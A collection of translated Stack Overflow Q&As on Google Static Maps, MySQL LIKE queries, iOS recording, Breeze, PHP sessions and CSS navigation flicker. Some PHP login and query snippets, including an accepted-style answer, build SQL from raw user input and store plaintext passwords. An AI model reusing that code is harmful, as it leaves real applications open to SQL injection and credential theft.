这是否发生了变化，他们是否忘记记录？文档页面上有一条警告说使用限制已更改（尽管声称的使用限制与以前相同！！）但它并没有说需要使用 API 密钥。

如果我达到了使用限制，我当然没有，那么我会（或应该）得到不同的响应，就像我过去经历的那样。

直到最近，完全相同的请求才起作用。

有人可以澄清吗？

示例请求： [http ://maps.google.com/staticmap?center=45.54309129999999,-73.62077841957398&zoom=16&size=480x360&maptype=mobile&markers=45.54309129999999,-73.62077841957398&sensor=false](http://maps.google.com/staticmap?center=45.54309129999999,-73.62077841957398&zoom=16&size=480x360&maptype=mobile&markers=45.54309129999999,-73.62077841957398&sensor=false)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T22:31:28.123

我似乎正在使用 V1 的旧 URL（其弃用期已结束），对于 V2，它必须是：

[`https://maps.googleapis.com/maps/api/staticmap?center=45.54309129999999,-73.62077841957398&zoom=16&size=480x360&maptype=hybrid&markers=45.54309129999999,-73.62077841957398&sensor=false&mobile=true`](https://maps.googleapis.com/maps/api/staticmap?center=45.54309129999999,-73.62077841957398&zoom=16&size=480x360&maptype=hybrid&markers=45.54309129999999,-73.62077841957398&sensor=false&mobile=true)

# mysql - mySQL - like 子句中的变量

> ID：15533951
> 
> 赞同：0
> 
> 时间：2013-03-20T20:24:36.777
> 
> 标签：mysql, variables, sql-like

如何在 LIKE 子句中使用 var？

以下代码未发送正确的响应...

```
$query = sprintf("
SELECT
place.ID AS id,

IF(
    place.translationID IS NULL,
    place.name,
    placel10n.text
    ) AS cityname,

FROM
places AS place

 LEFT JOIN `l10n-strings` AS placel10n ON (place.translationID = placel10n.translationID AND placel10n.languageCode = 'de')

 WHERE
 place.name LIKE CONCAT('$fchar', '%');
 AND
place.`status` = '1'

"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:34:25.957

如果`$fchar`包含您要搜索的字符串，您可以这样做：

```
$sql = "
SELECT
place.ID AS id,

IF(
    place.translationID IS NULL,
    place.name,
    placel10n.text
    ) AS cityname,

FROM
places AS place

 LEFT JOIN `l10n-strings` AS placel10n ON (place.translationID = placel10n.translationID AND placel10n.languageCode = 'de')

 WHERE
 place.name LIKE CONCAT('%s', '%');
 AND
place.`status` = '1'";

$query = sprintf($sql,$fchar); 
```

因此，如果`$fchar = 'apple'`，那么您的查询将尝试匹配“apple%”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:34:52.493

认为你可以做到

```
LIKE '$fchar%'; 
```

或者使用准备好的语句（但不清楚使用 sprintf 想要什么）

```
place.name LIKE :fchar;

$fchar = $fchar'.'%';

$something->bindParam(':fchar', $fchar, PDO::PARAM_STR); 
```

# ios - iOS 基于 UIImageView 动画录制游戏

> ID：15533952
> 
> 赞同：1
> 
> 时间：2013-03-20T20:24:38.770
> 
> 标签：ios, uiimageview, recording

我有一个基于动画 UIImageView 的游戏的 iOS 应用程序。

我想记录游戏过程。

我找到了一个[库](http://aroth.no-ip.org:82/wordpress/archives/673)，它在每个 drawRect 上捕获一个 UIImage，然后用所有 UIImage 制作一个视频。该库不适合我，因为视频每秒只需要 5 帧。

我发现的另一种选择是用户[Everyplay](https://developers.everyplay.com/doc)库，但仅适用于 coco2d 或 unity。

我有什么替代方法吗？我必须将我的游戏迁移到 coco2d 吗？

我需要在 Facebook 上分享游戏的视频。

# javascript - 为什么我的查询项的 entityAspect 为空？

> ID：15533955
> 
> 赞同：6
> 
> 时间：2013-03-20T20:24:46.067
> 
> 标签：javascript, sharepoint, typescript, edmx, breeze

使用由 SharePoint 支持的微风，如此[处](https://stackoverflow.com/q/15497258/1014822)所述，并使用 TypeScript 而不是 JS。

在 DataService 类中，我创建一个 EntityManager 并执行一个查询：

```
private servicePath: string = '/api/PATH/';
private manager: breeze.EntityManager;

constructor() {
    this.init();
}

private init(): void {
    this.manager = new breeze.EntityManager(this.servicePath);
}

public ListResponses(): breeze.Promise {
    var query = breeze.EntityQuery.from("Responses");
    return this.manager.executeQuery(query);
} 
```

然后我从我的视图模型中调用它，它工作正常：

```
private loadResponses(): void {
    this.dataservice.ListResponses().then((data) => {
        this.handleResponsesLoaded(data);
    }).fail((error) => {
        this.handleDataError(error);
    });
}

private handleResponsesLoaded(data:any): void {
    for (var i = 0; i < results.length; i++){
        this.extendItem(results[i]);
    }
    this.renderList(results, "#tp-responses-list");
} 
```

但是我尝试扩展每个项目都失败了，因为该项目`entityAspect`是空的：

```
private extendItem(item: any): void {
    item.entityAspect.propertyChanged.subscribe(() => {  // FAILS HERE
        setTimeout(() => {
            if (item.entityAspect.entityState.isModified()) {
                this.dataservice.SaveChanges().then((result) => {
                    tracer.Trace("SaveChanged Result: " + result);
                }).fail((error) => {
                    this.handleDataError(error);
                });
            }
        }, 0);
    });
} 
```

检查结果项后，我可以看到它只是普通数据对象，具有我期望的所有属性，但没有实体优点：

![在此处输入图像描述](../Images/9d2f644551ad31bf6d0edc6014d99840.png)

我刚刚开始使用微风，所以提出问题的最佳方式可能是：*我在这里做错了什么？*

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T20:32:07.407

如果 Breeze 在其元数据中找不到与它作为查询结果接收的匹配类型，它只会返回“原始”json 对象。

您的元数据不可用的原因通常是由于以下两种解释之一：

1）您没有序列化查询响应中的类型信息。[BreezeController] 属性或 [BreezeJsonFormatter] 属性都实现了这一点。

2) 查询本身不返回描述了元数据的类型。在这种情况下，您可以直接在客户端上创建元数据，也可以通过“元数据”方法从服务器返回。（有关第一个示例，请参见 Breeze Zip 包中的 NoDb 示例）。

如果您想将任何查询结果强制转换为“已知”元数据类型，您还可以查看 JsonResultsAdapter，但如果您使用 [BreezeController] 属性，这通常不是必需的。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-02T16:45:07.750

**以下答案不是我的，而是OP的。它发布在问题本身中，而它应该有答案。**

* * *

问题是命名空间不匹配。我正在从 Visual Studio 服务引用生成的 edmx 中提取元数据。此 edmx 使用它正在调用的服务的命名空间。我的代理对象位于不同的命名空间中。Breeze 的实体查找（即使使用短名称）的格式为 Type#Namespace，所以我没有得到任何匹配。我在服务器上调整了我的自定义 BuildJsonMetadata 方法以交换命名空间，现在我已经正确装饰了可以正常工作的实体。

# php - php会话注册并在另一个页面中获取值

> ID：15533961
> 
> 赞同：0
> 
> 时间：2013-03-20T20:25:11.680
> 
> 标签：php

我正在寻找让帐户的用户名显示在welcome.php 中的代码

我的 checklogin.php 代码在这里：

```
 <?php
            mysql_connect('localhost', 'root', '');
            mysql_select_db('bloodneeded');

            $username = $_POST['uname'];
            $password = $_POST['pass'];

            $sql = "SELECT * FROM welcome WHERE username= '$username' AND  password= '$password'";
            $result = mysql_query($sql);
            if ($result) {

                $count = mysql_num_rows($result);

                if ($count == 1) {

                    session_register("uname");
                    session_register("pass");
                    header("location:Welcome.php");
                } else {

                    echo "Wrong Username or Password";
                }
            }
            ?> 
```

Welcome.php 代码在这里：

```
<p id="form1"> Welcome  </p> 
```

我想要的只是在欢迎用户名附近“回显”登录用户的名字可以请任何人帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:32:34.690

不推荐使用`session_register()`。

相反，请使用`$_SESSION[]`Superglobal。

```
<?php

//You must write
if (!isset($_SESSION)) 
{
    session_start();
}
//on very first lines of your pages.

        mysql_connect('localhost', 'root', '');
        mysql_select_db('bloodneeded');

        $username = $_POST['uname'];
        $password = $_POST['pass'];

        $sql = "SELECT * FROM welcome WHERE username= '$username' AND  password= '$password'";
        $result = mysql_query($sql);
        if ($result) {

            $count = mysql_num_rows($result);

            if ($count == 1) {

                $_SESSION["uname"] = $_POST['uname'];
                //$_SESSION["pass"] = $_POST['pass']; No need to store password I think.
                header("location:Welcome.php");
            } else {

                echo "Wrong Username or Password";
            }
        }
        ?> 
```

获取用户名后

```
<p id="form1"> Welcome <?php echo $_SESSION["uname"]; ?> </p> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:31:25.250

请注意 session_register() 函数已[弃用](http://php.net/manual/en/function.session-register.php)，您可以使用 $_SESSION 代替：

1.  第一：你需要`session_start();`在所有页面上调用
2.  使用：`$_SESSION['uname'] = 'some value';`在第一页。
3.  通过以下方式打印会话：`echo $_SESSION['uname'];`在欢迎页面中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:39:25.130

1.  不要使用 mysql_ 它已弃用的扩展。[http://oleaass.com/why-people-needs-to-stop-using-the-mysql-extension/](http://oleaass.com/why-people-needs-to-stop-using-the-mysql-extension/)

请改用 PDO。2\. 我希望你只是将那个 P 标签 id="form1" 命名为表演......我永远不会这样命名。

```
<?php
session_start();

$session_uname = '';
if(!empty($_SESSION['uname']))
{
   $session_uname = htmlspecialchars($_SESSION['uname'], ENT_QUOTES);
} else
{
   // some fancy redirect to login page
}

?>

<input type="text" id="username" value="<?php echo $session_uname; ?>" /> 
```

# jquery - Off Canvas Mobile Nav - 渲染期间闪烁

> ID：15533963
> 
> 赞同：3
> 
> 时间：2013-03-20T20:25:16.823
> 
> 标签：jquery, html, css

网站的实时链接：[我的网站](http://khill.mhostiuckproductions.com/siteLSSBoilerPlate/)

JSFiddle： http: [//jsfiddle.net/MguqC/1/](http://jsfiddle.net/MguqC/1/) ***请注意，JS Fiddle 包含执行类切换和其他操作的 java，当将视口缩小到移动大小时，它的表现并不好。使用上面的实时链接以获得更好的视觉理解。

**背景故事：** 我为我的网站开发了一个非画布移动菜单，除了一些 jquery 类切换外，它只使用 CSS。导航是使用 PHP 动态生成的。最初，当我创建此导航时，我有两个单独的 Navigation 实例，它们为同一导航生成了两组 HTML。一个使用 生成`<nav>`，一个使用`<div id="nav">`.

这`<nav>`组 HTML 是为全宽桌面版导航设计的。使用媒体查询为网站的`<div id="nav">`移动版本设置了 HTML 集。使用媒体查询，我只是将移动版本隐藏在桌面大小，然后在移动媒体查询中隐藏桌面版本并将 #nav 设置为`display: block;`

这完美地工作，没有图形问题或问题。

**目前的故事：**

现在，我将两个独立的导航合并为一个更有弹性的 PHP 结构。也就是说，使用一组 HTML 并为移动设备等设置不同的样式会更容易、更有效。

我复制了该站点并煞费苦心地将移动类更改为相对`nav > ul > li > ul`选择器。（不再使用导航 ID，因为我有一组 HTML，我必须为一组 HTML 制作桌面和移动设备）。

由于某种原因，现在在任何移动设备上加载网站时（即使是桌面浏览器缩小到移动大小），当您加载页面时，您可以看到导航链接在页面上加载然后消失，因此“闪烁”。

我已经尝试将整个导航设置`display: none;`为媒体查询样式的顶部，然后`display: block;`在媒体查询样式的底部，我认为我可以隐藏导航，直到它设置样式并将其移出画布，然后将其设置为阻止所以让它“重新出现”，即使它会在屏幕外。但无济于事......这不起作用。

**我正在寻找此 Flash 的修复程序，我并不特别关心它是如何完成的，只要它不使用两组单独的 HTML 恢复到我以前的结构即可。**

***请注意，下面的 CSS 确实引用了 ID #nav。这是准确的，我没有删除 ID，我只是没有使用它来设置导航的大部分样式。导航 HTML 结构是子菜单导航的标准结构。UL - LI - A 在 LI 内部有 UL 等。

**CSS：**

```
/* 01\. MAIN NAVIGATION STYLES */

#nav {display: none !important;} /* IMPORTANT, PREVENTS NAV FROM FLASHING ON MOBILE */

.nav-container { /* THIS HAS BEEN RESET BELOW */
    /*overflow: hidden;*/
    height: 42px; /* height compensating for outer-border */
    border: 1px solid #dfdfdf; /* Outer grey border */
    border-radius: 5px;
}

#nav {display: block !important;} /* IMPORTANT, MAKES NAV VISIBLE AGAIN AFTER FLASH FIX ABOVE */

nav { /* THIS HAS BEEN RESET BELOW */
    height: 40px; /* height compensating to get white and grey border */
    border: 1px solid #fff; /* Inner white border */
    border-radius: 5px; /* rounded borders */
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr = '#fefefe', endColorstr = '#f3f3f3');
    -ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr = '#fefefe', endColorstr = '#f3f3f3')";
    background-image: -moz-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: -ms-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: -o-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: -webkit-gradient(linear, center top, center bottom, from(#fefefe), to(#f3f3f3));
    background-image: -webkit-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: linear-gradient(top, #fefefe, #f3f3f3);
}

nav ul {
    position: absolute; /* allows us to absolute position the subnavs */
    z-index: 10;
    display: block;
    width: 100%;
    height: 40px; /*height of inner nav for white border */
    padding: 0;
    margin: 0;
}

nav ul > li {
    position: relative; /* added */
    display: inline-block;
    height: 40px;
    padding: 0;
    margin: 0 0 0 -4px;
}

nav ul li:nth-child(1) {
    margin-left: 0px;
    border-radius: 5px 0px 0px 5px;
}

nav ul li a {
    color: #777;
    text-decoration: none;
    display: block;
    height: 24px;
    padding: 8px 16px;
    margin: 0;
}

nav ul li a:visited {
    color: #777;
}

nav > ul > li:hover > a {  /* USING > FORCES LI TO STAY IN HOVER STATE EVEN WHEN IN SUBNAV */
    color: #fff;
    text-decoration: none;
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr = '#555555', endColorstr = '#4c4c4c');
    -ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr = '#555555', endColorstr = '#4c4c4c')";
    background-image: -moz-linear-gradient(top, #555555, #4c4c4c);
    background-image: -ms-linear-gradient(top, #555555, #4c4c4c);
    background-image: -o-linear-gradient(top, #555555, #4c4c4c);
    background-image: -webkit-gradient(linear, center top, center bottom, from(#555555), to(#4c4c4c));
    background-image: -webkit-linear-gradient(top, #555555, #4c4c4c);
    background-image: linear-gradient(top, #555555, #4c4c4c);
}

nav > ul > li:nth-child(1) > a { /* FIX ROUNDED EDGE FOR FIRST A HOVER STATE */
    border-radius: 5px 0px 0px 5px;
}

/* Sub nav styles start here */

nav ul li > ul { /* BASIC STYLING PLUS HIDE */  /* THIS HAS BEEN RESET BELOW */
    position: absolute;
    display: none;
    z-index: 1;
    width: 150px;
    height: auto;
    top: 100%;
    left: 0;
    border: 1px solid #d4d4d4;
    background: #f6f6f6;
}

nav ul > li:hover > ul { /* ON HOVER MAKE SUB-NAV VISIBLE */
    display: block;
}

nav ul li ul li { /* THIS HAS BEEN RESET */
    position: relative;
    height: 40px;
    display: block;
    padding: 0;
    margin: 0;
    border-top: 1px solid #fff;
    border-right: none;
    border-bottom: 1px solid #f2f2f2;
    border-left: 1px solid #fff;
}

nav ul li ul li a {
    color: #777;
    height: 24px;
    padding: 8px 12px;
    margin: 0;
    background: #fafafa;
}

nav ul li ul li a:hover { /* SUB-NAV HOVER STATE */
    color: #777;
    text-decoration: none;
    background: #fff;
    border-left: 5px solid #555;
    -webkit-transition: all 0.4s ease;
    -moz-transition: all 0.4s ease;
    -ms-transition: border 0.4s ease;
    -o-transition: border 0.4s ease;
    transition: border 0.4s ease;
}

/* SECOND LEVEL SUB NAV STYLES */

nav ul li ul li ul {
    position: absolute;
    display: none;
    z-index: 1;
    width: 150px;
    height: auto;
    top: -2px;
    left: 100%;
    border: 1px solid #d4d4d4;
    background: #f6f6f6;
}

nav ul li ul li:hover > ul {
    display: block;
}

nav ul li .active {
    color: #fff;
    background: #8dc63f;
    background: -moz-linear-gradient(top,  #8dc63f 0%, #86bd3c 50%, #81b539 51%, #78a934 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#8dc63f), color-stop(50%,#86bd3c),            color-stop(51%,#81b539), color-stop(100%,#78a934));
    background: -webkit-linear-gradient(top,  #8dc63f 0%,#86bd3c 50%,#81b539 51%,#78a934 100%);
    background: -o-linear-gradient(top,  #8dc63f 0%,#86bd3c 50%,#81b539 51%,#78a934 100%);
    background: -ms-linear-gradient(top,  #8dc63f 0%,#86bd3c 50%,#81b539 51%,#78a934 100%);
    background: linear-gradient(to bottom,  #8dc63f 0%,#86bd3c 50%,#81b539 51%,#78a934 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#8dc63f', endColorstr='#78a934',GradientType=0 );
}

nav ul li a.active {
    color: #fff;
}

nav ul li a span.arrow {
    background: url(../../../images/nav/arrow-down.png) no-repeat 50% 50%;
    width: 9px;
    height: 9px;
    display: inline-block;
    overflow: hidden;
    margin-left: 10px;
    text-indent: -999em;
}

nav ul li ul li a span.arrow {
    text-align: right;
    text-indent: -999em;
    display: block;
    position: absolute;
    overflow: hidden;
    width: 9px;
    height: 9px;
    top: 16px;
    left: 100px;
    margin-left: 20%;
    background: url(../../../images/nav/arrow-right.png) no-repeat 50% 50%;
}

nav ul li ul li a:hover span.arrow {
    left: 105px;
    -webkit-transition: all 0.4s ease;
    -moz-transition: all 0.4s ease;
    -ms-transition: border 0.4s ease;
    -o-transition: border 0.4s ease;
    transition: border 0.4s ease;
}

/* Mobile nav buttons */

.nav-btn {
  display: block;
  width: 1.6em;
  height: 25px;
  padding: -11px;
  border: 0;
  outline: none;
  background: #87be3c url("../../../images/nav/nav-icon.svg") center center no-repeat;
  background-size: 1.875em 1.5em;
  overflow: hidden;
  white-space: nowrap;
  text-indent: 100%;
  filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=70);
  opacity: 0.7;
  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
}

.no-svg .nav-btn {
    background-image: url("../../../images/nav/nav-icon.png");
}

.nav-btn:hover, .nav-btn:focus {
  filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=100);
  opacity: 1;
}

.close-btn {
  display: block;
  width: 2.25em;
  height: 2.25em;
  padding: 0;
  border: 0;
  outline: none;
  background: url('../../../images/nav/close-btn.svg') left center no-repeat;
  background-size: 1.875em 1.875em;
  overflow: hidden;
  white-space: nowrap;
  text-indent: 100%;
  filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=100);
  opacity: 1;
  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
}

.no-svg .close-btn {
  background-image: url("../../../images/nav/close-btn.png");
}

.close-btn:focus, .close-btn:hover {
  filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=100);
  opacity: 1;
}

@media all and (min-width: 641px) {

.horizontal-mobile-nav {
    display: none;
}

} /* END MEDIA QUERY FOR MIN-WIDTH 641PX (DESKTOP/TABLET) */

@media all and (max-width: 640px) {

/* 3.0 MOBILE-NAV STYLES
-------------------------------*/
/* SET VISIBLE THE HORIZONTAL MOBILE NAV */

#nav* {display: none !important;} /* IMPORTANT, PREVENTS NAV FROM FLASHING ON MOBILE */

.nav-container { /* THIS HAS BEEN RESET BELOW */
    /*overflow: hidden;*/
    height: 42px; /* height compensating for outer-border */
    border: 1px solid #dfdfdf; /* Outer grey border */
    border-radius: 5px;
}

.horizontal-mobile-nav {
    display: block;
    height: 40px; /* height compensating to get white and grey border */
    border: 1px solid #fff; /* Inner white border */
    border-radius: 5px; /* rounded borders */
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr = '#fefefe', endColorstr = '#f3f3f3');
    -ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr = '#fefefe', endColorstr = '#f3f3f3')";
    background-image: -moz-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: -ms-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: -o-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: -webkit-gradient(linear, center top, center bottom, from(#fefefe), to(#f3f3f3));
    background-image: -webkit-linear-gradient(top, #fefefe, #f3f3f3);
    background-image: linear-gradient(top, #fefefe, #f3f3f3);
}

.horizontal-mobile-nav ul {
    position: absolute; /* allows us to absolute position the subnavs */
    z-index: 10;
    display: block;
    width: 100%;
    height: 40px; /*height of inner nav for white border */
    padding: 0;
    margin: 0;
}

.horizontal-mobile-nav ul > li {
    position: relative; /* added */
    display: inline-block;
    height: 40px;
    padding: 0;
    margin: 0 0 0 -4px;
}

.horizontal-mobile-nav ul li:nth-child(1) {
    margin-left: 0px;
    border-radius: 5px 0px 0px 5px;
}

.horizontal-mobile-nav ul li a {
    color: #777;
    text-decoration: none;
    display: block;
    height: 24px;
    padding: 8px 16px;
    margin: 0;
}

.horizontal-mobile-nav > ul > li:nth-child(1) > a { /* FIX ROUNDED EDGE FOR FIRST A HOVER STATE */
    border-radius: 5px 0px 0px 5px;
}

/* RESET THE ABOVE STYLES IN PREPARATION FOR THE MOBILE NAV THIS HAS TO BE A MEDIA QUERY */
nav { height: auto; border: none; border-radius: 0; background-image: none); }
nav ul { position: relative; z-index: 10; display: block; width: auto; height: auto; padding: 0; margin: 0; }
nav ul > li { position: relative; display: block; height: auto; padding: 0; margin: 0; }
nav ul li:nth-child(1) { margin-left: 0; border-radius: none; }
nav ul li a { color: #777; text-decoration: none; display: block; height: auto; padding: 0; margin: 0; }
nav ul li a:visited { color: #777; }
nav > ul > li:hover > a { color: #fff; text-decoration: none; background-image: none;}
nav > ul > li:nth-child(1) > a { border-radius: 0; }
/* Sub nav styles start here */
nav ul li > ul { position: relative; display: block; z-index: 1; width: auto; height: auto; top: 0; left: 0; border: none; background: none; }
nav ul li ul li { position: relative; height: auto; display: block; padding: 0; margin: 0; border: none; }
nav ul li ul li a { color: #777; height: auto; padding: 0; margin: 0; background: none; }
nav ul li ul li a:hover { color: #777; text-decoration: none; background: none; border-left: none; -webkit-transition: none; -moz-transition: none; -ms-transition: none; -o-transition: none; transition: none; }
/* SECOND LEVEL SUB NAV STYLES */
nav ul li ul li ul { position: relative; display: block; z-index: 1; width: auto; height: auto; top: 0; left: 0; border: none; background: none; }
nav ul li .active { color: #fff; background: none; }

/* Mobile Nav styles */  /* actual media query stuff from old nav */
nav ul li a span.arrow {
    display: none;
}

nav ul li ul li a span.arrow {
    display: none;
}

#nav {
    position: absolute;
    top: 0;
    padding-top: 100px;
}

#nav:not(:target) { /* not sure what this does */
    z-index: 1;
    height: 0;
}

#nav:target .close-btn {
    display: block;
}

#nav .close-btn {
    position: absolute;
    top: 20px;
    left: 40px;
}

#nav .block {
    position: relative;
    padding: 0;
}

#nav > ul {
    border-bottom: 1px solid #444;
    box-shadow:         0px 15px 15px rgba(8, 8, 8, 0.75);
}

#nav li {
    position: relative;
    padding: 0;
    margin: 0;
}

#nav ul li:last-child {
}

#nav ul li ul li:last-child {
    border-bottom: none;
}

#nav li.is-active:after { /* NOT SURE IF THIS DOES A FUCKIN THING */
    z-index: 50;
    display: block;
    content: "";
    position: absolute;
    top: 50%;
    right: -0.031em;
    margin-top: -0.625em;
    border-top: 0.625em transparent solid;
    border-bottom: 0.625em transparent solid;
    border-right: 0.625em white solid;
}

#nav li a { /* BUTTON STYLES AND SIZE */
    text-decoration: none;
    padding: 10px 0 10px 20px;
    border-top: 1px solid #444;
    border-bottom: 1px solid #222;  
}

#nav ul li a {
    background: #222222;
    background: -moz-linear-gradient(left,  #222222 0%, #222222 40%, #000000 100%);
    background: -webkit-gradient(linear, left top, right top, color-stop(0%,#222222), color-stop(40%,#222222),      color-stop(100%,#000000));
    background: -webkit-linear-gradient(left,  #222222 0%,#222222 40%,#000000 100%);
    background: -o-linear-gradient(left,  #222222 0%,#222222 40%,#000000 100%);
    background: -ms-linear-gradient(left,  #222222 0%,#222222 40%,#000000 100%);
    background: linear-gradient(to right,  #222222 0%,#222222 40%,#000000 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#222222', endColorstr='#000000',GradientType=1 );
    opacity: 0.8;
    -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity = 80);
    filter: alpha(opacity = 80);
}

#nav li a:hover {
    color: #fff;
    opacity: 0.4;
    -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity = 40);
    filter: alpha(opacity = 40);
}

#nav ul li ul li a {  /* INDENT SUBNAV ITEMS */
    padding-left: 35px;
}

#nav ul li ul li a:hover {

}

#nav ul li ul li ul li a {
    padding-left: 50px;
}

#nav ul li ul li ul li a:hover {

}

/* crazy shit */

.js-ready #nav {
    height: 100%;
    width: 70%;
    background: url(../../../images/nav/hixs_pattern_evolution.png);
    -webkit-box-shadow: inset -1.5em 0 1.5em -0.75em rgba(0, 0, 0, 0.25);
    -moz-box-shadow: inset -1.5em 0 1.5em -0.75em rgba(0, 0, 0, 0.25);
    box-shadow: inset -1.5em 0 1.5em -0.75em rgba(0, 0, 0, 0.25);
}

.js-ready #nav .block {
    background: transparent;
}

.js-ready #nav .close-btn {
    display: block;
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=70);
    opacity: 0.7;
}

.js-ready #nav .close-btn:focus, .js-ready #nav .close-btn:hover {
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=100);
    opacity: 1;
}

.js-ready #nav { /* move the nav off canvas */
    left: -70%;
}

.js-ready #canvas {
    left: 0;
}

.js-nav #inner-wrap {
    left: 70%;
}

.csstransforms3d.csstransitions.js-ready #nav {
    left: 0;
    -webkit-transform: translate3d(-100%, 0, 0);
    -moz-transform: translate3d(-100%, 0, 0);
    -ms-transform: translate3d(-100%, 0, 0);
    -o-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
    -webkit-backface-visibility: hidden;
    -moz-backface-visibility: hidden;
    -ms-backface-visibility: hidden;
    -o-backface-visibility: hidden;
    backface-visibility: hidden;
}

.csstransforms3d.csstransitions.js-ready #inner-wrap {
    left: 0 !important;
    -webkit-transform: translate3d(0, 0, 0);
    -moz-transform: translate3d(0, 0, 0);
    -ms-transform: translate3d(0, 0, 0);
    -o-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
    -webkit-transition: -webkit-transform 500ms ease;
    -moz-transition: -moz-transform 500ms ease;
    -o-transition: -o-transform 500ms ease;
    transition: transform 500ms ease;
    -webkit-backface-visibility: hidden;
    -moz-backface-visibility: hidden;
    -ms-backface-visibility: hidden;
    -o-backface-visibility: hidden;
    backface-visibility: hidden;
}

.csstransforms3d.csstransitions.js-nav #inner-wrap {
    -webkit-transform: translate3d(70%, 0, 0) scale3d(1, 1, 1);
    -moz-transform: translate3d(70%, 0, 0) scale3d(1, 1, 1);
    -ms-transform: translate3d(70%, 0, 0) scale3d(1, 1, 1);
    -o-transform: translate3d(70%, 0, 0) scale3d(1, 1, 1);
    transform: translate3d(70%, 0, 0) scale3d(1, 1, 1);
}

.csstransforms3d.csstransitions.js-ready #nav .block {
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=70);
    opacity: 0.7;
    -webkit-transition: opacity 300ms 100ms, -webkit-transform 500ms ease;
    -webkit-transition-delay: ease, 0s;
    -moz-transition: opacity 300ms 100ms ease, -moz-transform 500ms ease;
    -o-transition: opacity 300ms 100ms ease, -o-transform 500ms ease;
    transition: opacity 300ms 100ms ease, transform 500ms ease;
    -webkit-transform: translate3d(70%, 0, 0) scale3d(0.9, 0.9, 0.9);
    -moz-transform: translate3d(70%, 0, 0) scale3d(0.9, 0.9, 0.9);
    -ms-transform: translate3d(70%, 0, 0) scale3d(0.9, 0.9, 0.9);
    -o-transform: translate3d(70%, 0, 0) scale3d(0.9, 0.9, 0.9);
    transform: translate3d(70%, 0, 0) scale3d(0.9, 0.9, 0.9);
    -webkit-transform-origin: 50% 0%;
    -moz-transform-origin: 50% 0%;
    -ms-transform-origin: 50% 0%;
    -o-transform-origin: 50% 0%;
    transform-origin: 50% 0%;
}

.csstransforms3d.csstransitions.js-nav #nav .block {
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=100);
    opacity: 1;
    -webkit-transform: translate3d(0, 0, 0);
    -moz-transform: translate3d(0, 0, 0);
    -ms-transform: translate3d(0, 0, 0);
    -o-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
}

#nav {display: block !important;} /* IMPORTANT, MAKES NAV VISIBLE AGAIN AFTER FLASH FIX ABOVE */

} 
```

**HTML/PHP：**

```
<section class="nav-container">

        <section class="horizontal-mobile-nav">
            <ul>
                <li class="mobile-nav-btn">
                    <a class="nav-btn" id="nav-open-btn" href="#nav">Mobile Navigation</a>
                </li>
                <li>
                    <a href="index.php">Home</a>
                </li>
            </ul>
        </section>

        <nav id="nav">

        <?php
            echo "<ul>";
                foreach ($nav_array as $nav_title => $nav_data) {

                    echo buildLinks($nav_title, $nav_data, $base, $title);
                }
            echo "</ul>";
        ?>

        <a class="close-btn" id="nav-close-btn" href="#header">Return to Content</a>

        </nav>
        </section><!-- end nav container --> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-26T12:30:24.817

问题是您的导航可以处于*三种状态：*

*   桌面布局
*   移动布局
*   移动布局（禁用 JavaScript）

您看到的闪光是您在第三种状态下的导航样式。该脚本添加了 class `js-ready`，然后您的导航才会从画布视图中拉出。

修复非常简单，并且您已经拥有了大部分 CSS。在 CSS 文件的第 396 行是这样的：

```
#nav:not(:target) { /* not sure what this does */
    z-index: 1;
    height: 0;
} 
```

这样做是提供非 JS 后备。[尝试在原始示例页面](http://dbushell.github.com/Responsive-Off-Canvas-Menu/step4.html)上关闭 JavaScript ，您会发现移动导航仍然可以通过使用`:target`伪类来工作。解决方法是将这些行添加到上面的选择器中：

```
overflow: hidden;
padding: 0; 
```

然后，当您应用 JavaScript 版本的样式（样式表的第 532 行）时，重置这些属性：

```
.csstransforms3d.csstransitions.js-ready #nav {
    left: 0;
    overflow: visible;
    padding-top: 100px;
    ...
} 
```

剩下要做的唯一一件事（如果您认为这是优先事项）将修复第三种状态（您的移动布局没有 JavaScript）。您拥有 Modernizr 和大部分样式，所以这应该不会太难。

# css - 为新的 twitter 小部件设计样式（嵌入式时间线）

> ID：15533967
> 
> 赞同：16
> 
> 时间：2013-03-20T20:25:33.850
> 
> 标签：css, twitter, widget

